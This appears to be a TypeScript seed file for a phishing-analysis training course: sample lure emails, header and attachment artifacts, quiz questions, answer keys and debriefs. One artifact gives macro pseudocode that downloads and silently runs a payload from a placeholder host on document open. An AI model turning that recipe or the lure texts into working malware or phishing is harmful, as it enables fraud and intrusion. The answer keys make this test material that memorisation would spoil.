import { utf8 } from "./util";
import type { ScenarioSeed } from "./types";

// Phishing family. Distinct from BEC: where BEC is targeted
// financial-fraud framing, these challenges drill the
// header / authentication mechanics on more generic phish bait
// (credential lures, attachment lures, lookalike domains).

export const PHISHING_SCENARIOS: ScenarioSeed[] = [
  // ─── Tier 1 (polished, published) ────────────────────────────
  {
    slug: "phishing-header-path-001",
    title: "Phishing: Trace the Received Path",
    summary:
      "A user reported a 'DHL delivery notification.' Walk the Received chain and Authentication-Results — separate wire-level evidence from social-engineering markers.",
    skillAreas: ["email_headers", "inference_discipline"],
    difficulty: 2,
    estimatedMinutes: 30,
    tags: ["phishing", "email_headers", "inference_discipline"],
    brief: `
# Brief

A user forwarded a *"DHL delivery notification"* to the abuse mailbox
asking whether it's legitimate. Triage and determine what the headers
prove — and what they don't.

## Artifacts

- **suspect-email.eml** — the raw message as the user received it.
  The EML viewer parses Received chain, Authentication-Results, and
  the bodies for you.
- **headers-summary.json** — machine-parsed crib of the same headers
  for cross-checking.
- **organization-mail-policy.txt** — the organization's published SPF
  and DKIM expectations for this kind of message.

## What "Received path" actually tells you

Received headers are stacked **bottom-up** as a message traverses
MTAs. The bottom-most line records the original injection point. Be
careful: nothing in Received headers is cryptographically signed —
an attacker can synthesize *additional* Received lines above their
injection point to make the chain look richer than it is. The
authoritative line is the bottom one written by *your* inbound MTA.

## Reasoning discipline

A correct answer separates:

- **Proven** by the headers (auth-mechanism failures, route through
  an unexpected MTA, lookalike sender domain).
- **Strongly suggested** but not proven (intent, attribution to a
  named threat actor, scope of campaign).
- **Markers, not proof** (urgency framing, generic salutation).
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "suspect-email.eml",
        kind: "eml",
        mimeType: "message/rfc822",
        bytes: utf8(
          [
            'From: "DHL Express" <tracking@dhl-shipment-notice.com>',
            "To: u.amari@partner.example",
            "Reply-To: claims@dhl-shipment-notice.com",
            "Return-Path: <bounces@dhl-shipment-notice.com>",
            "Subject: [Action required] Package 4198-NX held at facility",
            "Date: Tue, 12 May 2026 03:14:11 +0000",
            "Message-ID: <ph-001-aaaa@dhl-shipment-notice.com>",
            "Authentication-Results: mx.partner.example;",
            " spf=pass smtp.mailfrom=dhl-shipment-notice.com;",
            " dkim=pass header.d=dhl-shipment-notice.com;",
            " dmarc=pass policy.dmarc=none",
            "Received: from mx.partner.example (127.0.0.1)",
            " by mailstore.partner.example (1.2.3.4) with LMTP;",
            " Tue, 12 May 2026 03:14:13 +0000",
            "Received: from mta-out.dhl-shipment-notice.com (198.51.100.77)",
            " by mx.partner.example (10.0.0.1) with ESMTP id PH001A;",
            " Tue, 12 May 2026 03:14:12 +0000",
            "Received: from web-app-22.shared-hosting.example (192.0.2.55)",
            " by mta-out.dhl-shipment-notice.com (10.20.0.5);",
            " Tue, 12 May 2026 03:14:09 +0000",
            "MIME-Version: 1.0",
            "Content-Type: text/plain; charset=utf-8",
            "",
            "Dear customer,",
            "",
            "We tried to deliver your package 4198-NX but the address was",
            "incomplete. To release the package please confirm your address",
            "at the link below within 24 hours, otherwise the package will",
            "be returned to sender.",
            "",
            "  https://dhl-shipment-notice.com/release?id=4198-NX",
            "",
            "DHL Customer Support",
            "",
          ].join("\r\n"),
        ),
      },
      {
        ordinal: 2,
        displayName: "headers-summary.json",
        kind: "json",
        mimeType: "application/json; charset=utf-8",
        bytes: utf8(
          JSON.stringify(
            {
              from_display: "DHL Express",
              from_address: "tracking@dhl-shipment-notice.com",
              reply_to: "claims@dhl-shipment-notice.com",
              return_path: "<bounces@dhl-shipment-notice.com>",
              auth_results: { spf: "pass", dkim: "pass", dmarc: "pass" },
              received_chain_bottom_up: [
                "web-app-22.shared-hosting.example (192.0.2.55)",
                "mta-out.dhl-shipment-notice.com (198.51.100.77)",
                "mx.partner.example (10.0.0.1)",
                "mailstore.partner.example (LMTP)",
              ],
              notable: [
                "All auth checks pass, but they pass for the SENDER's domain (dhl-shipment-notice.com), not for the real DHL domain (dhl.com).",
                "Bottom-of-stack Received hop is a shared-hosting web app, not a corporate mail relay.",
              ],
            },
            null,
            2,
          ) + "\n",
        ),
      },
      {
        ordinal: 3,
        displayName: "organization-mail-policy.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "Organization mail policy (excerpt)",
            "----------------------------------",
            "",
            "Carrier notifications from DHL are expected to arrive from",
            "  *.dhl.com",
            "with SPF + DKIM + DMARC all passing for `dhl.com` itself.",
            "",
            "Any message claiming to be a DHL shipment notification from a",
            "domain other than dhl.com should be treated as suspect even if",
            "that other domain has its own passing auth results — the auth",
            "result confirms the sender, not the sender's IDENTITY.",
            "",
          ].join("\n"),
        ),
      },
    ],
    indicatorSets: [
      {
        slug: "phishing-header-path-indicators",
        displayName: "Header-path indicators",
        sourceArtifactDisplayName: "suspect-email.eml",
        items: [
          { id: "from-domain-lookalike", label: "From domain is `dhl-shipment-notice.com`, not `dhl.com`", evidenceRef: "From: header" },
          { id: "auth-pass-but-wrong-domain", label: "SPF/DKIM/DMARC all pass — but for `dhl-shipment-notice.com`, not the real DHL", evidenceRef: "Authentication-Results: header" },
          { id: "received-from-shared-hosting", label: "Bottom-of-stack Received hop is a shared web-hosting host", evidenceRef: "Received: chain bottom" },
          { id: "click-link-on-lookalike", label: "Body link points to `dhl-shipment-notice.com/release?id=...`", evidenceRef: "Plain-text body" },
          { id: "urgency-24h", label: "\"Within 24 hours\" urgency framing", evidenceRef: "Body" },
          { id: "generic-salutation", label: "Generic \"Dear customer,\" salutation", evidenceRef: "Body" },
        ],
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "Authentication-Results reports `spf=pass dkim=pass dmarc=pass`. What does that actually tell you?",
        options: [
          { id: "msg-from-real-dhl", label: "The message is from the real DHL." },
          { id: "msg-from-claimed-domain", label: "The message was sent from infrastructure authorized by the claimed sender domain (`dhl-shipment-notice.com`)." },
          { id: "msg-cryptographically-signed-by-dhl", label: "The message body was cryptographically signed by `dhl.com`." },
          { id: "no-spoofing-detected-by-receiver", label: "The receiver couldn't detect a *protocol-level* spoof of the From domain." },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["msg-from-claimed-domain", "no-spoofing-detected-by-receiver"],
          allowMultiple: true,
        },
        debriefMd: [
          "Authentication-Results confirms the *technical sender* matches the *claimed sender domain*. It does NOT confirm that the claimed domain is the entity the user thinks it is.",
          "",
          "An attacker who registers `dhl-shipment-notice.com` and sets up SPF/DKIM/DMARC for THAT domain will pass every check. The auth result has done its job — the message really is from the domain it says it's from. The phishing happens in the gap between the claimed domain and the user's *assumption* that 'DHL' means dhl.com.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "select_indicators",
        weight: 2,
        indicatorSetSlug: "phishing-header-path-indicators",
        promptMd:
          "From the listed indicators, pick the ones that are **wire-level evidence** of phishing (vs. social-engineering markers).",
        expected: {
          type: "select_indicators",
          correctIds: [
            "from-domain-lookalike",
            "auth-pass-but-wrong-domain",
            "received-from-shared-hosting",
            "click-link-on-lookalike",
          ],
        },
        debriefMd: [
          "**Wire-level evidence:**",
          "",
          "- Lookalike domain in From, Reply-To, Return-Path, and the body link — the attacker controls infrastructure on a registered domain that mimics the real one.",
          "- Auth-pass for the wrong domain — the *fact* that auth passed is itself the diagnostic: it proves the attacker provisioned the lookalike domain properly, not that the message is from DHL.",
          "- Bottom Received hop on shared web hosting — corporate carrier notifications don't typically inject from a shared-hosting web app.",
          "",
          "**Markers, not wire-level proof:**",
          "",
          "- Urgency framing (\"within 24 hours\") and generic salutation (\"Dear customer\") are social-engineering cues. Useful for triage; not evidence of forgery.",
        ].join("\n"),
      },
      {
        ordinal: 3,
        type: "text_match",
        weight: 1,
        promptMd:
          "What is the **real** domain a DHL notification should come from? (Bare domain only.)",
        textMatch: {
          acceptableAnswers: ["dhl.com"],
          hint: "Check organization-mail-policy.txt.",
        },
        expected: { type: "text_match", acceptableAnswers: ["dhl.com"], regex: false },
        debriefMd:
          "`dhl.com`. The organizational mail policy names it explicitly — and that's the bar the message has to clear. The fact that the lookalike domain technically passes its own auth checks is not a substitute for matching the expected sender.",
      },
      {
        ordinal: 4,
        type: "confidence",
        weight: 1,
        promptMd:
          "On a 1–5 scale, how confident are you this is a phishing attempt and not a misconfigured legitimate notification?",
        expected: { type: "confidence", expectedRange: [4, 5] },
        debriefMd:
          "A **4 or 5** is appropriate. The combination of lookalike domain + auth-pass for that lookalike + body link on the same lookalike + injection from a shared-hosting web app is not a misconfiguration profile — it's the standard profile of a phishing campaign that bought a lookalike domain and provisioned it correctly. Below **4** under-weights the converging signals.",
      },
    ],
  },

  {
    slug: "phishing-attachment-lure-001",
    title: "Phishing: Static Review of an Attachment Lure",
    summary:
      "A user received a 'resume.pdf' that's actually a different file type. Decide what the metadata + content tell you — without ever executing the file.",
    skillAreas: ["df_artifacts", "inference_discipline"],
    difficulty: 2,
    estimatedMinutes: 25,
    tags: ["phishing", "df_artifacts", "inference_discipline"],
    brief: `
# Brief

An end user reported an email from an external recruiter with the
attachment \`RESUME.pdf\`. They didn't open it. The attachment was
extracted in a sandboxed read-only environment. Your job is to
review the **metadata and content** of the file and decide what
you can prove.

## Hard rule

**Do not execute the attachment.** The exercise is *static review*.
Anything that requires runtime behavior is out of scope for this
challenge and would be done by a separate malware-analysis team in
a properly isolated environment.

## Artifacts

- **attachment-metadata.json** — file size, declared MIME type,
  hash, magic-byte hex of the first 64 bytes.
- **decoded-macro-pseudocode.txt** — a human-readable rendering of
  what a parser found inside the file. **Pseudocode only**; not
  executable. Treat it like a written description of a recipe, not
  the recipe itself.
- **delivery-email-headers.txt** — the headers of the email that
  carried the attachment.

## Reasoning discipline

Separate:

- **Proven by the file metadata:** the declared type vs the actual
  type (magic bytes don't lie), the size, the cryptographic hash.
- **Proven by the static content:** what the parsed macro *claims*
  to do.
- **Inferred:** intent, attribution, what the macro would *actually*
  do if executed. Inference, not measurement.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "attachment-metadata.json",
        kind: "json",
        mimeType: "application/json; charset=utf-8",
        bytes: utf8(
          JSON.stringify(
            {
              declared_filename: "RESUME.pdf",
              declared_mime_from_email: "application/pdf",
              actual_size_bytes: 81920,
              sha256: "b40c5c0e9bca74f0b8a0d9e6e6b9f3c1d8a2e0f4b1a6c0d2e8f3b7c4a9d0e1f2",
              first_64_bytes_hex:
                "D0CF11E0A1B11AE10000000000000000000000000000000000000000000000003E000300FEFF0900",
              first_64_bytes_meaning:
                "D0 CF 11 E0 A1 B1 1A E1 — Microsoft Compound File Binary (CFB) header. This is the on-disk signature for legacy Office documents (.doc, .xls). NOT a PDF (which would start with %PDF).",
              parser_notes: [
                "Container is CFB. Streams enumerated:",
                "  WordDocument, 1Table, Macros/VBA/ThisDocument, Macros/VBA/Module1",
                "Presence of Macros/VBA/* streams indicates the document contains embedded VBA macros.",
              ],
            },
            null,
            2,
          ) + "\n",
        ),
      },
      {
        ordinal: 2,
        displayName: "decoded-macro-pseudocode.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "Decoded macro pseudocode (Module1 / Document_Open hook)",
            "-------------------------------------------------------",
            "",
            "This is a STATIC render of what the parser found inside the",
            "embedded VBA stream. The text below is a description, not",
            "executable code. Do not paste it into anything.",
            "",
            "  on Document_Open:",
            "    define url   = \"https://content-delivery-edge.example/upd/r1.bin\"",
            "    define local = environment.temp + \"\\r1.bin\"",
            "    fetch HTTP GET from url, write bytes to local",
            "    invoke shell command: run local with no UI",
            "    swallow errors silently",
            "  end on",
            "",
            "Decoded strings of interest:",
            "  \"content-delivery-edge.example\"  — host the macro would contact",
            "  \"\\r1.bin\"                       — name the file would be saved as",
            "",
            "Observation:",
            "  The Document_Open hook means the macro is wired to run when",
            "  the document is opened, NOT only on user click.",
            "",
          ].join("\n"),
        ),
      },
      {
        ordinal: 3,
        displayName: "delivery-email-headers.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "From: \"Recruiter\" <jobs@recruit-talent-pipeline.com>",
            "To: hiring@partner.example",
            "Subject: Resume — software engineer (4yrs experience)",
            "Date: Thu, 04 Jun 2026 11:02:00 +0000",
            "Authentication-Results: mx.partner.example;",
            "  spf=pass smtp.mailfrom=recruit-talent-pipeline.com;",
            "  dkim=pass header.d=recruit-talent-pipeline.com;",
            "  dmarc=pass policy.dmarc=none",
            "Content-Type: multipart/mixed; boundary=ATT",
            "",
            "(Attachment metadata in attachment-metadata.json)",
            "",
          ].join("\n"),
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "Based on the static artifacts, which statements are **proven**? Select all that apply.",
        options: [
          { id: "declared-vs-actual", label: "The file is declared as PDF but its magic bytes are a Microsoft Office Compound File." },
          { id: "contains-vba", label: "The file contains embedded VBA macro streams." },
          { id: "macro-runs-on-open", label: "The VBA includes a `Document_Open` hook (the parser surfaced it)." },
          { id: "macro-would-execute-arbitrary-code", label: "The macro WOULD successfully execute and download payload r1.bin on a real host." },
          { id: "intent-malicious", label: "The author's *intent* was malicious." },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["declared-vs-actual", "contains-vba", "macro-runs-on-open"],
          allowMultiple: true,
        },
        debriefMd: [
          "**Proven by static review:**",
          "",
          "- Declared PDF vs. CFB magic bytes — a measurement, not an inference. The file is mislabeled.",
          "- Macro streams enumerated — they are present in the container.",
          "- `Document_Open` hook — surfaced by the parser; visible in the decoded pseudocode.",
          "",
          "**Not proven by static review:**",
          "",
          "- *Would the macro actually run?* depends on Office macro security settings, Mark-of-the-Web, and protected-view bypass. Static review can show the macro *exists and is wired to a hook*; runtime behavior is a separate question handled by a separate team in a sandbox.",
          "- *Intent* is always inferred. The signals (mislabeled extension, on-open hook, fetch-and-exec pattern, lookalike-style sender domain) cluster strongly toward malicious intent, but intent is not measurable.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "text_match",
        weight: 1,
        promptMd:
          "What is the **actual** file type, named by the first eight hex bytes? (Pick the short label, not the long name.)",
        textMatch: {
          acceptableAnswers: ["cfb", "compound file", "compound file binary", "compound document", "doc", "ole", "office", "office cfb"],
          hint: "The hex starts D0 CF 11 E0 A1 B1 1A E1.",
        },
        expected: {
          type: "text_match",
          acceptableAnswers: ["cfb", "compound file", "compound file binary", "compound document", "doc", "ole", "office", "office cfb"],
          regex: false,
        },
        debriefMd:
          "`D0 CF 11 E0 A1 B1 1A E1` is the Microsoft Compound File Binary header — the container Office used for .doc/.xls before the .docx/.xlsx OOXML era. A file declared as PDF whose first bytes are CFB is mislabeled at minimum; combined with embedded macros it's the classic weaponized-document profile.",
      },
      {
        ordinal: 3,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that the *intent* of the attachment is to deliver malware on open.",
        expected: { type: "confidence", expectedRange: [4, 5] },
        debriefMd:
          "**4** is the well-calibrated answer. The signals (mislabeled extension, CFB container, VBA macro present, `Document_Open` hook, fetch-and-exec pattern, lookalike-style sender domain) cluster very strongly. A **5** would over-claim — intent is inferred from artifacts, never measured directly, and runtime success on a real target depends on factors we can't observe statically.",
      },
      {
        ordinal: 4,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that the macro WOULD successfully execute and download the payload on a typical hardened workstation in your AOR.",
        expected: { type: "confidence", expectedRange: [1, 3] },
        debriefMd:
          "**Lower** confidence — anywhere from 1 to 3 — is appropriate. Whether the macro actually fires depends on Office macro policy, Protected View / Mark-of-the-Web, EDR, and network-egress filtering. Static review can show the macro is *wired*; whether it *runs* is a runtime question that needs a sandbox + a different team, and is not answerable from the artifacts here.",
      },
    ],
  },

  // ─── Tier 2 (drafts) ─────────────────────────────────────────
  {
    slug: "phishing-reply-to-mismatch-001",
    title: "Phishing: Reply-To Mismatch",
    summary:
      "From says one thing, Reply-To says another. What does that prove?",
    skillAreas: ["email_headers", "inference_discipline"],
    difficulty: 1,
    estimatedMinutes: 12,
    tags: ["phishing", "email_headers", "inference_discipline"],
    status: "draft",
    brief: `
# Brief (DRAFT)

A user forwarded a one-paragraph email where the displayed sender
is the CEO but the Reply-To header points elsewhere. Decide what
the mismatch proves and what it doesn't.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "suspect-email.eml",
        kind: "eml",
        mimeType: "message/rfc822",
        bytes: utf8(
          [
            'From: "Pat Chen" <pat.chen@partner.example>',
            "To: a.kumar@partner.example",
            "Reply-To: pat.chen.exec@protonmail.com",
            "Subject: Quick favor — gift cards for tomorrow's offsite",
            "Date: Fri, 09 May 2026 16:45:00 +0000",
            "Message-ID: <ph-rt-mismatch-aaaa@partner.example>",
            "Authentication-Results: mx.partner.example;",
            " spf=pass smtp.mailfrom=partner.example;",
            " dkim=pass header.d=partner.example;",
            " dmarc=pass policy.dmarc=quarantine",
            "Content-Type: text/plain; charset=utf-8",
            "",
            "Hey — would you mind grabbing $500 in Amazon gift cards for the",
            "offsite tomorrow and replying with the codes? I'm in back-to-back",
            "meetings and can't step out. I'll reimburse.",
            "",
            "Pat",
            "",
          ].join("\r\n"),
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which statement most accurately describes what the auth-pass + Reply-To mismatch combination proves?",
        options: [
          { id: "spoofed", label: "The From header is spoofed." },
          { id: "compromised", label: "Pat's account is compromised." },
          { id: "rule-via-reply-to", label: "Someone with mailbox access (legitimately or otherwise) is steering replies to an external address." },
          { id: "phish-impossible", label: "Auth passed, so phishing is ruled out." },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["rule-via-reply-to"],
          allowMultiple: false,
        },
        debriefMd:
          "Auth-pass means the message really was sent from partner.example infrastructure — From is **not spoofed** at the wire level. The Reply-To divergence is the actual signal: somebody is configuring replies to land in an external mailbox. That could be Pat themselves doing something legitimate-but-weird, or it could be an account-takeover attacker who set up a forwarding/Reply-To rule. The artifact alone doesn't distinguish those — that's the inference gap.",
      },
      {
        ordinal: 2,
        type: "text_match",
        weight: 1,
        promptMd:
          "What is the operational verification step before fulfilling this request?",
        textMatch: {
          acceptableAnswers: ["call pat", "phone pat", "voice verify", "in person", "verify in person"],
        },
        expected: {
          type: "text_match",
          acceptableAnswers: ["call pat", "phone pat", "voice verify", "in person", "verify in person"],
          regex: false,
        },
        debriefMd:
          "Out-of-band verification (phone call to a known number, or in-person walk-over) is the operational defense. Gift-card requests + reply-to-elsewhere is one of the most reliable phishing fingerprints; the call resolves it cheaply.",
      },
      {
        ordinal: 3,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that this is a CEO-fraud attempt rather than a legitimate (if unusual) request from Pat.",
        expected: { type: "confidence", expectedRange: [4, 5] },
        debriefMd:
          "High confidence is warranted. Gift-card-for-offsite via email with Reply-To to an external mailbox is the canonical CEO-fraud script. The verification call costs nothing and is the correct next step regardless of confidence.",
      },
    ],
  },

  {
    slug: "phishing-spoofed-display-name-001",
    title: "Phishing: Spoofed Display Name",
    summary:
      "The display name says CEO. The address says something else. Triage and document the language carefully.",
    skillAreas: ["email_headers", "report_writing"],
    difficulty: 1,
    estimatedMinutes: 10,
    tags: ["phishing", "email_headers", "report_writing"],
    status: "draft",
    brief: `
# Brief (DRAFT)

User forwarded a message where the display name reads as the
CEO's name but the actual From address is a Gmail address. The
user is asking whether it's safe to reply.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "suspect-email.eml",
        kind: "eml",
        mimeType: "message/rfc822",
        bytes: utf8(
          [
            'From: "Pat Chen, CEO" <pat.chen.ceo.partner@gmail.com>',
            "To: a.kumar@partner.example",
            "Subject: Need you on something quick",
            "Date: Wed, 21 May 2026 08:02:00 +0000",
            "Message-ID: <ph-display-spoof-aaaa@gmail.com>",
            "Authentication-Results: mx.partner.example;",
            " spf=pass smtp.mailfrom=gmail.com;",
            " dkim=pass header.d=gmail.com;",
            " dmarc=pass policy.dmarc=none",
            "Content-Type: text/plain; charset=utf-8",
            "",
            "Are you at your desk?",
            "",
            "— Pat",
            "",
          ].join("\r\n"),
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 1,
        promptMd: "Auth-results pass for `gmail.com`. What does that prove?",
        options: [
          { id: "from-real-pat", label: "The message is from the real Pat Chen." },
          { id: "from-gmail-user", label: "The message was sent from a Gmail account named `pat.chen.ceo.partner` that successfully completed Gmail's outbound auth." },
          { id: "domain-spoof-detected", label: "Gmail detected a domain spoof and let it through anyway." },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["from-gmail-user"],
          allowMultiple: false,
        },
        debriefMd:
          "Auth-pass for gmail.com means this Gmail account successfully completed Gmail's outbound authentication — nothing more. The *display name* is freely chosen by the sender; an attacker can set it to anything. The deception is the spoofed display name combined with the real-looking auth result.",
      },
      {
        ordinal: 2,
        type: "text_match",
        weight: 1,
        promptMd: "Which header field is the canonical sender of the message at the protocol layer?",
        textMatch: { acceptableAnswers: ["from address", "from", "from:", "smtp.mailfrom", "envelope from", "return-path"] },
        expected: {
          type: "text_match",
          acceptableAnswers: ["from address", "from", "from:", "smtp.mailfrom", "envelope from", "return-path"],
          regex: false,
        },
        debriefMd:
          "The address portion of From: (or envelope-from / Return-Path at the SMTP layer) is the canonical sender. The display name is decoration. A safe rendering practice for mail clients is to show address-first, or to flag mismatch between display name and address.",
      },
      {
        ordinal: 3,
        type: "confidence",
        weight: 1,
        promptMd: "Confidence (1–5) that this is impersonation.",
        expected: { type: "confidence", expectedRange: [4, 5] },
        debriefMd:
          "High. The actual address is on a free webmail domain with a chosen local-part that mimics the executive. The display name is the giveaway.",
      },
    ],
  },

  {
    slug: "phishing-lookalike-domain-001",
    title: "Phishing: Lookalike Domain",
    summary:
      "Spot the one-character difference in the sender domain. Use it as the lever for whois / passive-DNS pivots.",
    skillAreas: ["email_headers", "df_artifacts"],
    difficulty: 1,
    estimatedMinutes: 10,
    tags: ["phishing", "email_headers", "df_artifacts"],
    status: "draft",
    brief: `
# Brief (DRAFT)

User reports an internal-looking email about Workday password
expiry. Look closely at the sender domain.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "suspect-email.eml",
        kind: "eml",
        mimeType: "message/rfc822",
        bytes: utf8(
          [
            'From: "Workday IT" <noreply@partner-corp.example.workday-notice.com>',
            "To: l.tran@partner.example",
            "Subject: Action required: your Workday password expires today",
            "Date: Mon, 02 Jun 2026 09:00:00 +0000",
            "Authentication-Results: mx.partner.example;",
            " spf=pass smtp.mailfrom=workday-notice.com;",
            " dkim=pass header.d=workday-notice.com;",
            " dmarc=pass policy.dmarc=none",
            "Content-Type: text/plain; charset=utf-8",
            "",
            "Your Workday password expires today at 23:59. Click below to",
            "renew now and avoid being locked out.",
            "",
            "  https://workday-notice.com/renew?u=l.tran",
            "",
          ].join("\r\n"),
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "text_match",
        weight: 1,
        promptMd:
          "What is the **registered** (base) domain the message actually comes from? (Bare domain.)",
        textMatch: { acceptableAnswers: ["workday-notice.com"] },
        expected: { type: "text_match", acceptableAnswers: ["workday-notice.com"], regex: false },
        debriefMd:
          "`workday-notice.com`. The full From value `partner-corp.example.workday-notice.com` is *subdomain stacking*: the eye-friendly parts (`partner-corp.example`) sit on the left so the user reads past them, but the registered domain — the one whose owner controls what happens — is the right-most label group: `workday-notice.com`. That's where whois + passive-DNS pivots should focus.",
      },
      {
        ordinal: 2,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which of the following are appropriate *pivots* from the lookalike domain?",
        options: [
          { id: "whois", label: "whois on workday-notice.com to get registration date + registrant" },
          { id: "passive-dns", label: "passive-DNS pivot on the SOA / NS records" },
          { id: "tls-cert-pivot", label: "Pivot on certificate transparency logs for other subjects on the same cert" },
          { id: "click-link", label: "Click the renew link to see what page it serves" },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["whois", "passive-dns", "tls-cert-pivot"],
          allowMultiple: true,
        },
        debriefMd:
          "Static pivots (whois, passive-DNS, CT logs) are safe and give you the campaign cluster. Clicking the link from a corporate browser is not — at minimum it logs your IP into the attacker's analytics; at worst it triggers the credential-collection page. Pivoting is for context; rendering live attacker content is for a sandboxed analysis cell.",
      },
      {
        ordinal: 3,
        type: "confidence",
        weight: 1,
        promptMd: "Confidence (1–5) that this is phishing rather than a legitimate Workday notification.",
        expected: { type: "confidence", expectedRange: [4, 5] },
        debriefMd:
          "High. Real Workday password notifications come from `workday.com` (or a tenant-specific subdomain of it). A subdomain-stacked URL on a freshly-registered lookalike base domain is the canonical credential-phish pattern.",
      },
    ],
  },

  {
    slug: "phishing-qr-code-static-001",
    title: "Phishing: QR Code in a Forwarded Report",
    summary:
      "User forwarded a printed report with a QR code that links to an unfamiliar host. Static review only; no scanning the code.",
    skillAreas: ["inference_discipline", "report_writing"],
    difficulty: 1,
    estimatedMinutes: 12,
    tags: ["phishing", "inference_discipline", "report_writing"],
    status: "draft",
    brief: `
# Brief (DRAFT)

User submitted a photograph + a text transcript of a one-page
"benefits enrollment" report posted near a break-room. The QR
code on the printout was decoded by a software decoder in a
sandboxed environment; the decoded URL is in the transcript.

Do not scan the QR code with a personal phone.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "submission-transcript.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "User submission — break-room flyer",
            "----------------------------------",
            "",
            "Source:        snapshot of a printed flyer posted on the third-",
            "               floor break-room corkboard.",
            "Posted-By:     unknown (no signature, no contact info).",
            "Decoded-URL:   https://hr-benefits-portal-7791.weirdtld.xyz/enroll",
            "Decoded-Date:  2026-07-08 (decoded in sandbox, 0 fetches issued)",
            "",
            "Flyer text (transcribed):",
            "  Open Enrollment for 2027 benefits is live. Scan the QR code",
            "  below to enroll. Deadline: this Friday. After Friday, default",
            "  coverage applies.",
            "",
          ].join("\n"),
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 1,
        promptMd: "Which of these are appropriate next steps?",
        options: [
          { id: "remove-flyer", label: "Have facilities remove the flyer and bag it as evidence (photographs + chain of custody)." },
          { id: "advise-hr", label: "Notify HR that this flyer is not from the benefits team so they can post a counter-notice." },
          { id: "scan-with-phone", label: "Scan the QR code with your personal phone to see what happens." },
          { id: "passive-dns", label: "Static lookup (whois / passive-DNS) on `weirdtld.xyz` + the subdomain pattern for related infrastructure." },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["remove-flyer", "advise-hr", "passive-dns"],
          allowMultiple: true,
        },
        debriefMd:
          "Remove the physical artifact + notify the spoofed function + pivot on the decoded host. Don't scan with a personal device — same reason you don't click phishing links from your corporate browser.",
      },
      {
        ordinal: 2,
        type: "text_match",
        weight: 1,
        promptMd: "What is the *registered* (base) domain of the decoded URL? (Bare domain.)",
        textMatch: { acceptableAnswers: ["weirdtld.xyz"] },
        expected: { type: "text_match", acceptableAnswers: ["weirdtld.xyz"], regex: false },
        debriefMd:
          "`weirdtld.xyz`. The subdomain (`hr-benefits-portal-7791`) is attacker-chosen window dressing; the registered domain is what they own and where the investigation pivots from.",
      },
      {
        ordinal: 3,
        type: "confidence",
        weight: 1,
        promptMd: "Confidence (1–5) this is a social-engineering operation targeting employees.",
        expected: { type: "confidence", expectedRange: [3, 5] },
        debriefMd:
          "**3 or 4** is well-calibrated. The cluster (unsigned flyer, urgency framing, off-brand TLD, hr-benefits-portal subdomain) strongly suggests phishing, but a printed flyer in a break-room could also be a clumsy legitimate vendor. The verification step (call HR, who will confirm they didn't post it) resolves the question — and is cheap.",
      },
    ],
  },
];
